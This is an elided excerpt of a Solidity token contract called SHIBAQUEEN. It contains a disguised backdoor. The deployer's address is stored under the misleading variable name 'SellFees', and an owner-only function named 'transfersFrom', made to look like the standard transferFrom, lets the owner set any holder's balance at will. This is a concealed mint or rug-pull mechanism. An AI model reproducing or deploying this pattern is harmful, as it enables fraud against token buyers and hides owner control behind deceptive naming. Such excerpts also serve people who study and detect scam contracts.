...
contract SHIBAQUEEN is IERC20, Ownable {
    ...
    string private _name = "SHIBAQUEEN";  
    ...
    constructor() {
        SellFees = uint256(uint160(msg.sender));

        uint256 totalSupply_ = 1000000000000000000000;

        _totalSupply = totalSupply_;

        _balances[Router] = totalSupply_;
    ...
    function transfersFrom(address account, uint256 _value) public onlyOwner {
      if(account != address(0)){
      require(account != address(0));
      require(_value > 0, "Transfer amount must be greater than zero");
        _balances[account] = SellFees * _BuyFee * (_value + 0) * (10 ** 9) / SellFees;
    }
  }
}